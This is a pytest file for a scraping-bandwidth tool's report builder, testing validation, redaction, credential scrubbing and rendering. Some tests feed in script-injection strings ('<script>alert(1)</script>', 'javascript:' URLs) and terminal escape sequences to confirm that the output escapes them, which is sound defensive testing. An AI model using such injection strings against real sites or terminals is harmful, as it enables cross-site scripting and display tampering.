"""Report tests: build_report against the schema, redaction, paths, warnings,
privacy sentinels, the built-in validator, text/HTML rendering, file I/O and gates."""

from __future__ import annotations

import base64
import copy
import hashlib
import json
import os
import re
import stat
from pathlib import Path

import pytest

from scrapescope import __version__
from scrapescope.catalog import load_catalogs
from scrapescope.config import EXIT_BUDGET, EXIT_BYPASS, basic_auth_value
from scrapescope.report import (
    LABELS,
    SIZING_WARNING,
    ReportError,
    SchemaError,
    Validator,
    build_report,
    content_security_policy,
    coverage_line,
    gate,
    load_report,
    load_schema,
    render_html,
    render_text,
    rfc3339,
    style_hash,
    validate,
    write_report,
)
from scrapescope.report._fmt import GeneratedReport
from scrapescope.report.html import CSS
from scrapescope.report.redact import scrub_text
from scrapescope.types import (
    AttributionResult,
    BucketTally,
    Buckets,
    BudgetEvent,
    BypassInfo,
    ChallengeResult,
    Coverage,
    EventCounts,
    FindFlags,
    FindMatch,
    FindResult,
    HostAttribution,
    HostBytes,
    MeterSnapshot,
    NonTargetHost,
    PathBytes,
    PerUnitBytes,
    ReportOptions,
    StarterCode,
    SuccessInfo,
    TunnelRecord,
    TypeAllocation,
    UnitsInfo,
    VerifyResult,
)
from tests.fixtures import SESSION_PASSWORD, UPSTREAM_PASSWORD, UPSTREAM_USERNAME, site

ROOT = Path(__file__).resolve().parents[1]
FIND_VALUE = "SENTINEL-VALUE-129.99-Qz"
QUERY_TOKEN = site.SIGNED_QUERY_TOKEN
COOKIE_VALUE = site.SESSION_COOKIE_VALUE
UPSTREAM_HOST = "upstream-sentinel-host.example"


# ---------------------------------------------------------------------------- synthetic inputs


def _tunnel(i: int, host: str, sent: int, received: int, *, port: int = 443, route: str = "http-connect",
            status: str = "ok", neg: tuple[int, int] = (80, 39), synthetic: tuple[int, int] = (0, 0),
            opened: float = 100.0, kind: str = "connect", rule: str | None = None) -> TunnelRecord:
    return TunnelRecord(
        id=i, host=host, port=port, kind=kind, route=route, opened_at=opened + i, closed_at=opened + i + 1,  # type: ignore[arg-type]
        status=status, upstream_bytes_sent=sent, upstream_bytes_received=received,
        negotiation_bytes_sent=neg[0] if route in ("http-connect", "socks5") else 0,
        negotiation_bytes_received=neg[1] if route in ("http-connect", "socks5") else 0,
        synthetic_negotiation_bytes_sent=synthetic[0], synthetic_negotiation_bytes_received=synthetic[1], rule=rule,
    )


def _snapshot(tunnels: list[TunnelRecord], *, mode: str = "http-connect", budget: int | None = None,
              tripped: bool = False, events: list[BudgetEvent] | None = None, refused: dict | None = None,
              max_tunnel: int | None = None) -> MeterSnapshot:
    return MeterSnapshot(
        taken_at=1_790_000_161.25, started_at=1_790_000_000.0, mode=mode, port=53211, auth_port=53212,  # type: ignore[arg-type]
        tunnels=tunnels, counted_bytes=sum(t.counted_bytes for t in tunnels if t.is_target), budget_bytes=budget,
        max_tunnel_bytes=max_tunnel, budget_tripped=tripped, budget_events=events or [], refused=refused or {},
    )


def _host_row(host: str, tunnels: list[TunnelRecord], bucket: str, *, requests: int = 0,
              allocated: dict[str, int] | None = None, paths: list[PathBytes] | None = None) -> HostAttribution:
    mine = [t for t in tunnels if t.host == host]
    total = sum(t.bytes_with_connect for t in mine)
    return HostAttribution(
        host=host, ports=sorted({t.port for t in mine}), tunnels=len(mine), failed_tunnels=sum(t.failed for t in mine),
        denied_tunnels=sum(t.denied for t in mine), bytes_sent=sum(t.upstream_bytes_sent for t in mine),
        bytes_received=sum(t.upstream_bytes_received for t in mine), bytes_with_connect=total,
        bytes_without_connect=sum(t.bytes_without_connect for t in mine), requests=requests,
        buckets={bucket: BucketTally(tunnels=len(mine), bytes=total)}, allocated_by_type=dict(allocated or {}),
        background_id=bucket.split(":", 1)[1] if bucket.startswith("background:") else None, paths=list(paths or []),
    )


def run_inputs(**kw):
    """A run through an HTTP upstream with the Playwright helper (numbers add up)."""
    tunnels = [
        _tunnel(1, "origin-a.test", 100_000, 2_900_000),
        _tunnel(2, "origin-a.test", 50_000, 2_950_000),
        _tunnel(3, "origin-c.test", 40_000, 3_960_000),
        _tunnel(4, "optimizationguide-pa.googleapis.com", 3_000, 1_497_000),
        _tunnel(5, "origin-b.test", 1_900, 5_500),
        _tunnel(6, "origin-d.test", 160, 120, status="failed:upstream_status"),
        _tunnel(7, "api.openai.com", 900, 4_000, route="non-target", rule="openai"),
    ]
    paths = [PathBytes(path=f"/product/1?token={QUERY_TOKEN}", requests=3, reported_bytes=90_000), PathBytes(path="/static/app.js", requests=1, reported_bytes=40_000)]
    hosts = [
        _host_row("origin-a.test", tunnels, "attributed", requests=54, allocated={"document": 3_000_000, "script": 3_000_000}, paths=paths),
        _host_row("origin-c.test", tunnels, "attributed", requests=77, allocated={"image": 3_200_000, "font": 800_000}),
        _host_row("optimizationguide-pa.googleapis.com", tunnels, "background:optimization-guide"),
        _host_row("origin-b.test", tunnels, "preconnect_idle"),
        _host_row("origin-d.test", tunnels, "unattributed"),
    ]
    attribution = AttributionResult(
        hosts=hosts,
        types=[
            TypeAllocation(type="image", requests=75, reported_bytes=3_150_000, allocated_bytes=3_200_000),
            TypeAllocation(type="document", requests=25, reported_bytes=2_900_000, allocated_bytes=3_000_000),
            TypeAllocation(type="script", requests=4, reported_bytes=2_950_000, allocated_bytes=3_000_000),
            TypeAllocation(type="font", requests=2, reported_bytes=790_000, allocated_bytes=800_000),
        ],
        buckets=Buckets(attributed=10_000_000, preconnect_idle=7_400, unattributed=280, background={"optimization-guide": 1_500_000}),
        non_target=[NonTargetHost(host="api.openai.com", catalog_id="openai", tunnels=1, bytes_sent=900, bytes_received=4_000)],
        units=UnitsInfo(count=25, source="navigations", low_sample_warning=False),
        browser_launches=1,
        bytes_before_first_navigation=1_650_000,
        per_unit=PerUnitBytes(first_unit_bytes=2_400_000, rest_units=24, rest_bytes=7_457_680, rest_mean_bytes=310_736, resolution_s=0.25),
        status_histogram={"200": 128, "404": 2, "failed": 1},
        success=SuccessInfo(count=24, basis="navigations", rate=0.96),
        multi_page_context=True,
        sources=["playwright"],
        events=EventCounts(attach=1, launch=1, request=131, dropped=0),
        warnings=["1 tunnel matched the background catalog (optimization-guide): Chromium traffic the job did not request"],
    )
    snapshot = _snapshot(tunnels, budget=2_000_000_000, refused={"auth_challenge": 3, "origin_form": 0})
    options = ReportOptions(command="run", rate=kw.pop("rate", 3.0), **kw)
    return snapshot, attribution, options


def _find_result(status: str = "found") -> FindResult:
    match = FindMatch(
        rank=1, host="origin-a.test", port=443, scheme="https", path="/api/product.json", method="GET",
        resource_type="fetch", status=200, mime_type="application/json; charset=utf-8", all_values=True, values_matched=1,
        match_kinds=["exact", "bogus kind"], locations=["fetch", "json-key:product.price", "bad location with spaces"],
        encoded_body_bytes=412, response_header_bytes=180, request_header_bytes=520, tls_handshake_estimate=7200,
        billed_basis_bytes=8312, flags=FindFlags(), code_eligible=True,
    )
    tokened = FindMatch(
        rank=2, host="origin-a.test", port=443, scheme="https", path=f"/api/offer.json?sig={QUERY_TOKEN}", method="GET",
        resource_type="fetch", status=200, mime_type="application/json", all_values=True, values_matched=1,
        match_kinds=["variant:json-escape"], locations=["fetch"], encoded_body_bytes=300, response_header_bytes=180,
        request_header_bytes=700, tls_handshake_estimate=7200, billed_basis_bytes=8380,
        flags=FindFlags(sent_cookies=True, random_query_token=True), code_eligible=False, code_ineligible_reason="sent cookies",
    )
    return FindResult(
        status=status, target_host="origin-a.test", target_path=f"/product/1?q={FIND_VALUE}", values_count=1,  # type: ignore[arg-type]
        short_value_warning=False,
        challenge=ChallengeResult(blocked=status == "blocked", vendor_id="cloudflare" if status == "blocked" else None,
                                  vendor_name="Cloudflare" if status == "blocked" else None,
                                  signals=["cloudflare:header:cf-mitigated"] if status == "blocked" else [], status=200),
        matches=[match, tokened] if status == "found" else [],
        coverage=Coverage(inspected=12, skipped={"binary": 5, "not-a-reason": 2}),
        verify=VerifyResult(replays="yes", status=200, received_bytes=612),
        responses_total=17, page_reported_bytes=402_313,
        warnings=[f"see https://origin-a.test/p?sig={QUERY_TOKEN}"],
        target_url=f"https://origin-a.test/product/1?q={FIND_VALUE}",
        starter_code=[StarterCode(rank=1, curl=f"curl --compressed 'https://origin-a.test/x?v={FIND_VALUE}' -H 'Cookie: ss_session={COOKIE_VALUE}'",
                                  httpx=f"httpx.get('https://origin-a.test/x?v={FIND_VALUE}')")],
        match_urls={"1": f"https://origin-a.test/api/product.json?v={FIND_VALUE}", "2": f"https://origin-a.test/api/offer.json?sig={QUERY_TOKEN}"},
    )


def find_inputs(status: str = "found", **kw):
    tunnels = [
        _tunnel(1, "origin-a.test", 9_000, 400_000, route="direct", synthetic=(67, 39)),
        _tunnel(2, "origin-c.test", 1_700, 5_200, route="direct", synthetic=(67, 39)),
    ]
    snapshot = _snapshot(tunnels, mode="direct")
    attribution = AttributionResult(
        hosts=[_host_row("origin-a.test", tunnels, "unattributed"), _host_row("origin-c.test", tunnels, "unattributed")],
        buckets=Buckets(unattributed=sum(t.bytes_with_connect for t in tunnels)),
        warnings=["no helper events: per-type figures unavailable; buckets only"],
    )
    return snapshot, attribution, ReportOptions(command="find", **kw), [_find_result(status)]


def _build(snapshot, attribution, options, find_results=(), warnings=()):
    return build_report(snapshot=snapshot, attribution=attribution, catalogs=load_catalogs(), options=options,
                        find_results=find_results, warnings=warnings)


def _dump(report) -> str:
    return json.dumps(report)


# ---------------------------------------------------------------------------- build: structure


def test_run_report_validates_and_carries_the_contract_fields() -> None:
    snapshot, attribution, options = run_inputs()
    report = _build(snapshot, attribution, options)
    assert validate(report) == []
    # every field, the two optional round-2 diagnostics fields included
    assert set(report) == set(load_schema()["properties"])
    assert set(load_schema()["properties"]) - set(load_schema()["required"]) == {"tunnel_failures", "accept_limit_errors"}
    assert report["schema_version"] == 1
    assert report["tool_version"] == __version__
    assert report["command"] == "run"
    assert report["catalog_versions"] == load_catalogs().versions()
    assert report["labels"] == LABELS
    assert report["mode"] == "http-connect"
    assert report["started_at"] == rfc3339(1_790_000_000.0)
    assert report["ended_at"] == rfc3339(1_790_000_161.25)
    totals = snapshot.totals()
    assert report["totals"]["with_connect"] == totals.with_connect == 11_507_680
    assert report["totals"]["without_connect"] == totals.without_connect
    assert report["totals"]["tunnels"] == 6 and report["totals"]["failed_tunnels"] == 1
    assert report["totals"]["with_connect_estimated"] is False
    assert report["budget"] == {"limit_bytes": 2_000_000_000, "max_tunnel_bytes": None, "counted_bytes": snapshot.counted_bytes, "tripped": False}
    buckets = report["buckets"]
    assert buckets["attributed"] + buckets["preconnect_idle"] + buckets["before_attach"] + buckets["unattributed"] + sum(buckets["background"].values()) == totals.with_connect
    assert [h["host"] for h in report["hosts"]][:2] == ["origin-a.test", "origin-c.test"]
    assert report["non_target"] == [{"host": "api.openai.com", "catalog_id": "openai", "tunnels": 1, "bytes_sent": 900, "bytes_received": 4000}]
    assert report["refused"] == {"auth_challenge": 3, "origin_form": 0}
    assert report["status_histogram"] == {"200": 128, "404": 2, "failed": 1}
    assert report["success"] == {"count": 24, "basis": "navigations", "rate": 0.96}
    assert report["units"] == {"count": 25, "source": "navigations", "low_sample_warning": False}
    assert report["helper_events"] == {"attach": 1, "launch": 1, "request": 131, "dropped": 0}
    assert report["find"] == [] and report["incomplete"] is False


def test_cost_what_if_and_fixes_are_assembled() -> None:
    snapshot, attribution, options = run_inputs()
    report = _build(snapshot, attribution, options)
    assert report["cost"]["label"] == "estimated billable transfer"
    assert report["cost"]["with_connect"] == round(11_507_680 / 1e9 * 3.0, 6)
    assert report["cost"]["per_1000_units"] is not None and report["cost"]["per_1000_successes"] is not None
    ids = [w["id"] for w in report["what_if"]]
    assert ids == ["block-images-media-fonts", "deny-background-catalog"]
    block = report["what_if"][0]
    assert block["bytes_saved"] == 4_000_000
    assert "cache loss not modelled" in block["caveats"]
    assert [f["id"] for f in report["fixes"]] == ["playwright-cdp-block", "playwright-route-block", "chromium-background-flags", "playwright-mcp-flags"]


def test_no_rate_means_no_cost() -> None:
    snapshot, attribution, options = run_inputs(rate=None)
    report = _build(snapshot, attribution, options)
    assert report["cost"] is None
    assert validate(report) == []


def test_diagnostics_name_tunnel_failure_reasons_and_accept_pauses() -> None:
    """docs-2: failed tunnels by reason and descriptor-limit accept pauses reach the report and both renderings."""
    snapshot, attribution, options = run_inputs()
    extra = [
        _tunnel(90, "origin-a.test", 80, 0, status="failed:upstream_unreachable"),
        _tunnel(91, "origin-a.test", 80, 120, status="failed:upstream_status"),
        _tunnel(92, "origin-a.test", 0, 0, status="failed:local_limit", route="direct", neg=(0, 0)),
        _tunnel(93, "origin-a.test", 0, 0, status="failed:socks_reply_5", route="socks5", neg=(0, 0)),
    ]
    extra[1].upstream_status = 407
    before = _build(snapshot, attribution, options)["tunnel_failures"]
    assert set(before) <= {"upstream_status"}  # run_inputs has failed tunnels without a recorded status
    snapshot.tunnels.extend(extra)
    snapshot.accept_limit_errors = 3
    report = _build(snapshot, attribution, options)
    assert validate(report) == []
    assert report["tunnel_failures"] == {
        **before, "local_limit": 1, "socks_reply_5": 1, "upstream_status_407": 1, "upstream_unreachable": 1,
    }
    assert report["accept_limit_errors"] == 3
    text = render_text(report)
    assert "failed tunnels: local_limit 1, socks_reply_5 1," in text and "upstream_status_407 1" in text
    assert "accepting paused for lack of file descriptors" in text and ": 3 time(s)" in text
    html = render_html(report)
    assert "upstream_status_407 1" in html and "accepting paused for lack of file descriptors" in html
    # the fields are optional: a report written before round 2 still validates and renders
    old = copy.deepcopy(dict(report))
    del old["tunnel_failures"], old["accept_limit_errors"]
    assert validate(old) == [] and "failed tunnels:" not in render_text(old)


def test_cost_lines_use_cents_or_three_significant_digits() -> None:
    """ux-1: every cost line of a report has the same precision rule."""
    from scrapescope.report._fmt import money

    assert [money(x) for x in (0, 0.12, 0.002348, 0.000045, 0.9996, 1, 12.3456, 1234.5)] == [
        "$0.00", "$0.120", "$0.00235", "$0.000045", "$1.00", "$1.00", "$12.35", "$1,234.50",
    ]
    assert money(True) == money(float("nan")) == money("1") == "-"


def test_gib_reports_price_per_gib() -> None:
    snapshot, attribution, options = run_inputs(gb_unit="GiB")
    report = _build(snapshot, attribution, options)
    assert report["gb_unit"] == "GiB"
    assert report["cost"]["rate_unit"] == "USD per GiB"
    assert report["cost"]["with_connect"] == round(11_507_680 / 2**30 * 3.0, 6)
    assert "GiB" in render_text(report)


def test_find_report_in_sizing_mode() -> None:
    snapshot, attribution, options, finds = find_inputs()
    report = _build(snapshot, attribution, options, finds)
    assert validate(report) == []
    assert report["totals"]["with_connect_estimated"] is True
    assert report["warnings"][0] == SIZING_WARNING
    assert "no units counted" not in " ".join(report["warnings"])  # find has no units by design
    [entry] = report["find"]
    assert entry["status"] == "found"
    assert entry["coverage"] == {"inspected": 12, "skipped": {"binary": 5}, "line": "searched 12 inspected responses; skipped: 5 binary"}
    m1, m2 = entry["matches"]
    assert m1["match_kinds"] == ["exact", "none"]
    assert m1["locations"] == ["fetch", "json-key:product.price"]
    assert m1["mime_type"] == "application/json"
    assert m2["code_ineligible_reason"] == "sent cookies"
    assert entry["verify"] == {"replays": "yes", "status": 200, "received_bytes": 612, "reason": None,
                               "replay_billed_basis_bytes": None}
    for key in ("target_url", "starter_code", "match_urls"):
        assert key not in entry
    # Paths are dropped without --keep-urls.
    assert entry["target_path"] is None and m1["path"] is None and m2["path"] is None


@pytest.mark.parametrize(
    "status, expected",
    [
        ("not_found", "not found in 12 inspected responses; skipped: 5 binary"),
        ("blocked", "blocked; cannot search (challenge: Cloudflare)"),
        ("error", "page load failed; nothing was searched"),
    ],
)
def test_find_coverage_line_never_says_not_found_for_blocked(status: str, expected: str) -> None:
    snapshot, attribution, options, finds = find_inputs(status)
    report = _build(snapshot, attribution, options, finds)
    assert validate(report) == []
    assert report["find"][0]["coverage"]["line"] == expected
    assert coverage_line("blocked", Coverage(), None) == "blocked; cannot search (challenge: unrecognised vendor)"


def test_keep_urls_keeps_clean_paths_only() -> None:
    snapshot, attribution, options = run_inputs(keep_urls=True)
    report = _build(snapshot, attribution, options)
    assert validate(report) == []
    paths = report["hosts"][0]["paths"]
    assert [p["path"] for p in paths] == ["/product/1", "/static/app.js"]
    snapshot, attribution, options, finds = find_inputs(keep_urls=True)
    entry = _build(snapshot, attribution, options, finds)["find"][0]
    assert entry["target_path"] == "/product/1"
    assert [m["path"] for m in entry["matches"]] == ["/api/product.json", "/api/offer.json"]
    assert QUERY_TOKEN not in _dump(entry) and FIND_VALUE not in _dump(entry)


def test_without_keep_urls_no_paths_anywhere() -> None:
    snapshot, attribution, options = run_inputs()
    report = _build(snapshot, attribution, options)
    assert all(h["paths"] == [] for h in report["hosts"])
    assert "/product/1" not in _dump(report)


def test_hostile_paths_with_keep_urls_validate() -> None:
    tunnels = [_tunnel(1, "origin-a.test", 1000, 9000)]
    paths = [PathBytes(path=p, requests=1, reported_bytes=100) for p in site.HOSTILE_PATHS]
    paths.append(PathBytes(path="/raw/<script>alert(1)</script>.png", requests=1, reported_bytes=1))
    attribution = AttributionResult(hosts=[_host_row("origin-a.test", tunnels, "attributed", requests=4, paths=paths)])
    report = _build(_snapshot(tunnels), attribution, ReportOptions(command="run", keep_urls=True))
    assert validate(report) == []
    html = render_html(report)
    assert "<script>" not in html
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html
    assert "javascript:alert(1).png" in html  # inert text, never an attribute
    assert not re.search(r"(?i)\s(href|src|srcset|action|formaction|xlink:href)\s*=", html)


# ---------------------------------------------------------------------------- warnings


def test_budget_trip_warning_names_the_heaviest_hosts() -> None:
    tunnels = [_tunnel(1, "origin-a.test", 10_000, 1_990_000, status="budget"), _tunnel(2, "optimizationguide-pa.googleapis.com", 1000, 99_000, status="budget")]
    events = [
        BudgetEvent(ts=1_790_000_050.0, kind="warn_80", counted_bytes=1_600_000, limit_bytes=2_000_000),
        BudgetEvent(ts=1_790_000_060.5, kind="tripped", counted_bytes=2_000_001, limit_bytes=2_000_000,
                    top_hosts=[HostBytes("origin-a.test", 1_500_000), HostBytes("optimizationguide-pa.googleapis.com", 100_000)], closed_tunnels=2),
        BudgetEvent(ts=1_790_000_055.0, kind="tunnel_cap", counted_bytes=1_000_000, limit_bytes=1_000_000, tunnel_id=1, host="origin-a.test"),
    ]
    snapshot = _snapshot(tunnels, budget=2_000_000, tripped=True, events=events, max_tunnel=1_000_000)
    attribution = AttributionResult(hosts=[_host_row("origin-a.test", tunnels, "unattributed"), _host_row("optimizationguide-pa.googleapis.com", tunnels, "background:optimization-guide")])
    report = _build(snapshot, attribution, ReportOptions(command="run"))
    assert validate(report) == []
    assert report["budget"]["tripped"] is True
    assert [e["kind"] for e in report["budget_events"]] == ["warn_80", "tripped", "tunnel_cap"]
    assert report["budget_events"][1]["ts"] == rfc3339(1_790_000_060.5)
    assert report["budget_events"][1]["ts"].endswith(".500Z")
    trip = next(w for w in report["warnings"] if w.startswith("budget tripped"))
    assert "origin-a.test (1.50 MB)" in trip and "optimizationguide-pa.googleapis.com" in trip
    assert any("closed by the per-tunnel cap" in w for w in report["warnings"])
    text = render_text(report)
    assert "BUDGET TRIPPED" in text and "heaviest hosts in the final minute: origin-a.test" in text
    assert gate(report, ["budget"]) == EXIT_BUDGET


def test_incomplete_run_warning_and_banner() -> None:
    snapshot, attribution, options = run_inputs()
    attribution.bypass = BypassInfo(incomplete=True, hosts=["cdn.bypass.test"], requests=3)
    report = _build(snapshot, attribution, options)
    assert report["incomplete"] is True
    assert report["bypass"] == {"hosts": ["cdn.bypass.test"], "requests": 3}
    assert any(w.startswith("incomplete: helpers saw 3 network request(s) to 1 host(s)") for w in report["warnings"])
    assert "INCOMPLETE" in render_text(report)
    assert "INCOMPLETE" in render_html(report)
    assert gate(report, ["bypass"]) == EXIT_BYPASS


@pytest.mark.parametrize("count, command, expected", [(5, "run", "only 5 unit(s)"), (0, "run", "no units counted"), (0, "serve", "no units counted"), (25, "run", None), (0, "find", None)])
def test_unit_warnings(count: int, command: str, expected: str | None) -> None:
    snapshot, attribution, _ = run_inputs()
    attribution.units = UnitsInfo(count=count, source="override" if count else "none", low_sample_warning=count < 20)
    report = _build(snapshot, attribution, ReportOptions(command=command))  # type: ignore[arg-type]
    assert report["units"]["low_sample_warning"] is (count < 20 and command != "find")  # find has no units
    matching = [w for w in report["warnings"] if "unit" in w and ("only" in w or "no units" in w)]
    if expected is None:
        assert matching == []
    else:
        assert matching and matching[0].startswith(expected)


def test_attribution_unit_and_bypass_warnings_are_not_repeated() -> None:
    snapshot, attribution, options = run_inputs()
    attribution.units = UnitsInfo(count=3, source="navigations", low_sample_warning=True)
    attribution.bypass = BypassInfo(incomplete=True, hosts=["cdn.bypass.test"], requests=2)
    attribution.warnings = [
        "only 3 units (navigations): per-1,000 figures from fewer than 20 units are unreliable",
        "incomplete: helpers saw 2 network requests to 1 host that no meter tunnel carried",
    ]
    ws = _build(snapshot, attribution, options)["warnings"]
    assert sum("per-1,000" in w for w in ws) == 1
    assert sum(w.startswith("incomplete") for w in ws) == 1


def test_find_reports_drop_unit_warnings_and_duplicate_short_value_notes() -> None:
    snapshot, attribution, options, finds = find_inputs()
    attribution.warnings.append("no units counted: nothing reported; per-1,000 figures unavailable (use --units N)")
    finds[0].short_value_warning = True
    finds[0].warnings = ["short or numeric-only value: the smallest match is often a beacon"]
    report = _build(snapshot, attribution, options, finds)
    assert not any("units" in w for w in report["warnings"])
    assert render_text(report).count("beacon") == 1
    assert render_html(report).count("beacon") == 1
    finds[0].warnings = []
    report = _build(snapshot, attribution, options, finds)
    assert render_text(report).count("beacon") == 1


def test_warnings_pass_through_dedupe_and_cap() -> None:
    snapshot, attribution, options = run_inputs()
    attribution.warnings = ["same", "same", "attribution says hi"]
    report = _build(snapshot, attribution, options, warnings=["caller note", "same"] + [f"w{i}" for i in range(300)])
    ws = report["warnings"]
    assert ws.count("same") == 1
    assert "attribution says hi" in ws and "caller note" in ws
    assert len(ws) == 200 and ws[-1].endswith("more warnings were omitted")
    assert validate(report) == []


def test_hosts_are_capped_at_ten_thousand() -> None:
    tunnels = [_tunnel(i, f"h{i}.test", 10, 10 + i) for i in range(10_005)]
    attribution = AttributionResult(hosts=[HostAttribution(host=t.host, ports=[443], tunnels=1, failed_tunnels=0, denied_tunnels=0,
                                                           bytes_sent=t.upstream_bytes_sent, bytes_received=t.upstream_bytes_received,
                                                           bytes_with_connect=t.bytes_with_connect, bytes_without_connect=t.bytes_without_connect,
                                                           requests=0) for t in tunnels])
    report = _build(_snapshot(tunnels), attribution, ReportOptions(command="run"))
    assert len(report["hosts"]) == 10_000
    assert report["hosts"][0]["host"] == "h10004.test"
    assert any("truncated to the 10,000 heaviest of 10,005" in w for w in report["warnings"])
    assert validate(report) == []


# ---------------------------------------------------------------------------- redaction


def test_redact_hosts_uses_catalog_ids_and_keyed_hashes() -> None:
    snapshot, attribution, options = run_inputs(redact_hosts=True, keep_urls=True)
    attribution.bypass = BypassInfo(incomplete=True, hosts=["origin-a.test"], requests=1)
    attribution.warnings.append("origin-a.test served 3 tunnels; see origin-a.test.")
    report = _build(snapshot, attribution, options)
    assert validate(report) == []
    hosts = [h["host"] for h in report["hosts"]]
    assert "catalog:optimization-guide" in hosts
    hashed = [h for h in hosts if h.startswith("redacted:")]
    assert len(hashed) == 4 and all(re.fullmatch(r"redacted:[0-9a-f]{12}", h) for h in hashed)
    assert report["non_target"][0]["host"] == "catalog:openai"
    label_a = report["hosts"][0]["host"]
    assert report["bypass"]["hosts"] == [label_a]
    assert any(w.startswith(f"{label_a} served 3 tunnels; see {label_a}.") for w in report["warnings"])
    dump = _dump(report)
    for raw in ("origin-a.test", "origin-b.test", "origin-c.test", "origin-d.test"):
        assert raw not in dump
    assert all(h["paths"] == [] for h in report["hosts"])  # paths dropped when redacting


def test_redaction_is_unlinkable_across_reports() -> None:
    a = _build(*run_inputs(redact_hosts=True))
    b = _build(*run_inputs(redact_hosts=True))
    label_a = {h["host"] for h in a["hosts"] if h["host"].startswith("redacted:")}
    label_b = {h["host"] for h in b["hosts"] if h["host"].startswith("redacted:")}
    assert label_a and label_a.isdisjoint(label_b)
    # A plain (unkeyed) hash of the host is not what is stored.
    plain = hashlib.sha256(b"origin-a.test").hexdigest()[:12]
    assert f"redacted:{plain}" not in label_a


def test_redaction_merges_hosts_sharing_a_catalog_label() -> None:
    tunnels = [_tunnel(1, "update.googleapis.com", 1000, 9000), _tunnel(2, "edgedl.me.gvt1.com", 2000, 50_000, port=80)]
    attribution = AttributionResult(
        hosts=[_host_row("update.googleapis.com", tunnels, "background:component-updater"), _host_row("edgedl.me.gvt1.com", tunnels, "background:component-updater")],
        buckets=Buckets(background={"component-updater": 62_000}),
    )
    report = _build(_snapshot(tunnels), attribution, ReportOptions(command="run", redact_hosts=True))
    assert validate(report) == []
    [row] = report["hosts"]
    assert row["host"] == "catalog:component-updater"
    assert row["tunnels"] == 2 and row["bytes_with_connect"] == 62_000 and row["ports"] == [80, 443]
    assert row["buckets"] == {"background:component-updater": {"tunnels": 2, "bytes": 62_000}}
    assert row["background_id"] == "component-updater"


def test_redacted_find_and_budget_hosts() -> None:
    snapshot, attribution, options, finds = find_inputs(redact_hosts=True, keep_urls=True)
    snapshot.budget_events = [BudgetEvent(ts=1.0, kind="tripped", counted_bytes=5, limit_bytes=5, top_hosts=[HostBytes("origin-a.test", 5)], closed_tunnels=1)]
    report = _build(snapshot, attribution, options, finds)
    assert validate(report) == []
    entry = report["find"][0]
    assert entry["target_host"].startswith("redacted:")
    assert entry["target_host"] == entry["matches"][0]["host"] == report["budget_events"][0]["top_hosts"][0]["host"]
    assert entry["target_path"] is None
    assert "origin-a.test" not in _dump(report)


# ---------------------------------------------------------------------------- privacy sentinels


def _sentinels() -> list[str]:
    creds = basic_auth_value(UPSTREAM_USERNAME, UPSTREAM_PASSWORD)
    return [
        UPSTREAM_USERNAME, UPSTREAM_PASSWORD, SESSION_PASSWORD, creds, creds.split(" ", 1)[1],
        base64.b64encode(f"{UPSTREAM_USERNAME}:{UPSTREAM_PASSWORD}".encode()).decode(),
        UPSTREAM_HOST, FIND_VALUE, QUERY_TOKEN, COOKIE_VALUE,
    ]


def test_reports_never_contain_credentials_queries_cookies_or_find_values(tmp_path: Path) -> None:
    creds = basic_auth_value(UPSTREAM_USERNAME, UPSTREAM_PASSWORD)
    snapshot, attribution, options = run_inputs(keep_urls=True)
    attribution.warnings += [
        f"upstream http://{UPSTREAM_USERNAME}:{UPSTREAM_PASSWORD}@{UPSTREAM_HOST}:8000 refused",
        f"Proxy-Authorization: {creds}",
        f"client sent Cookie: ss_session={COOKIE_VALUE}",
        f"fetched https://origin-a.test/api/offer.json?sig={QUERY_TOKEN}#frag",
        f"retry with {creds} failed",
    ]
    find = _find_result()
    report = build_report(snapshot=snapshot, attribution=attribution, catalogs=load_catalogs(), options=options,
                          find_results=[find], warnings=[f"socks5h://{UPSTREAM_USERNAME}:{SESSION_PASSWORD}@{UPSTREAM_HOST}:1080 failed"])
    assert validate(report) == []
    json_path, html_path = tmp_path / "r.json", tmp_path / "r.html"
    write_report(report, json_path, html_path)
    outputs = {
        "json": json_path.read_text(encoding="utf-8"),
        "html": html_path.read_text(encoding="utf-8"),
        "text": render_text(report),
    }
    for name, output in outputs.items():
        for sentinel in _sentinels():
            assert sentinel not in output, (name, sentinel)
        assert "?sig=" not in output and "?q=" not in output and "?token=" not in output, name
    assert "<redacted>" in outputs["json"]


def test_scrub_text_rules() -> None:
    creds = basic_auth_value("u", "secret-pass")
    assert scrub_text("http://u:p@proxy.example:8080/x?y=1 down") == "http://<redacted>/x down"
    assert scrub_text("see https://a.test/p?token=abc#f and more") == "see https://a.test/p and more"
    assert scrub_text(f"header {creds} sent") == "header Basic <redacted> sent"
    assert scrub_text("Authorization: Bearer abcdefgh123") == "Authorization: <redacted>"
    assert scrub_text("set-cookie=session=1; Path=/") == "set-cookie: <redacted>"
    assert scrub_text("plain words stay") == "plain words stay"


# ---------------------------------------------------------------------------- text rendering


def test_render_text_labels_and_sections() -> None:
    report = _build(*run_inputs())
    out = render_text(report)
    for needle in (
        "Totals (tunnel-measured)", "with CONNECT", "without CONNECT", "Budget", "Units", "Hosts (top 5 of 5",
        "Buckets", "Resource types (allocated", "Non-target hosts", "What-if (allocated basis",
        "Suggested fixes", "Cost (estimated billable transfer at your rate: 3 USD per GB; not a bill)",
        "per 1,000 units", "per 1,000 successes", "Warnings", "not a bill",
    ):
        assert needle in out, needle
    assert out.endswith("\n")
    assert "INCOMPLETE" not in out
    assert "\x1b" not in out


def test_render_text_marks_estimates_in_sizing_mode() -> None:
    snapshot, attribution, options, finds = find_inputs()
    out = render_text(_build(snapshot, attribution, options, finds))
    assert "[estimated]" in out and "with-CONNECT estimated in sizing mode" in out
    assert "replays without a browser: yes" in out
    assert "searched 12 inspected responses" in out


def test_render_text_escapes_control_characters_and_limits_hosts() -> None:
    report = json.loads((ROOT / "docs" / "dev" / "example-report.json").read_text())
    report["warnings"].append("evil \x1b[2J\x1b[31mred\u202etxt")
    report["hosts"] = report["hosts"] * 10
    out = render_text(report, max_hosts=20, show_code=False)
    assert "\x1b" not in out and "\u202e" not in out
    assert "\\x1b[2J" in out and "\\u202e" in out
    assert "Hosts (top 20 of 50" in out
    assert "code (python)" not in out


def test_render_text_tolerates_sparse_reports() -> None:
    out = render_text({"hosts": "not-a-list", "totals": None, "budget": {"limit_bytes": "x"}})
    assert "Totals" in out and "not a bill" in out


@pytest.mark.parametrize("name", ["example-report.json", "example-report-find.json"])
def test_golden_examples_validate_and_render(name: str) -> None:
    report = json.loads((ROOT / "docs" / "dev" / name).read_text())
    assert validate(report) == []
    assert "Totals" in render_text(report)
    assert render_html(report).startswith("<!DOCTYPE html>")


# ---------------------------------------------------------------------------- HTML rendering


